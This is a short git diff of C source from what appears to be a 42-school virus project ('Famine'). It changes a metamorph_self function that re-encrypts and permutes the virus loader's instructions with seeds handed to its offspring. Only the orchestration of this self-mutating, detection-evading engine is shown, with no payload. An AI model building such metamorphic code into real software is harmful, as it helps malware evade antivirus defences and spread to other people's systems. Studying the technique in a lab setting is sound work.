@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/19 00:59:01 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/20 00:04:45 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -34,17 +34,18 @@
 **
 */
 
+void		mark_below(void);
 void		return_to_client(void);
 
 bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])
 {
 	size_t	cypher_size = (size_t)cypher_end - (size_t)cypher;
-	size_t	loader_size = return_to_client - famine_entry; // tmp size
+	size_t	loader_size = return_to_client - mark_below; // tmp size
 
 	if (!yield_seed_to_heir(seed, son_seed)
 	|| !generate_cypher((void *)cypher, son_seed[0], cypher_size)
 	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
-	|| !permutate_instructions(famine_entry, loader_size)
+	|| !permutate_instructions(mark_below, son_seed[0], loader_size)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 	return true;
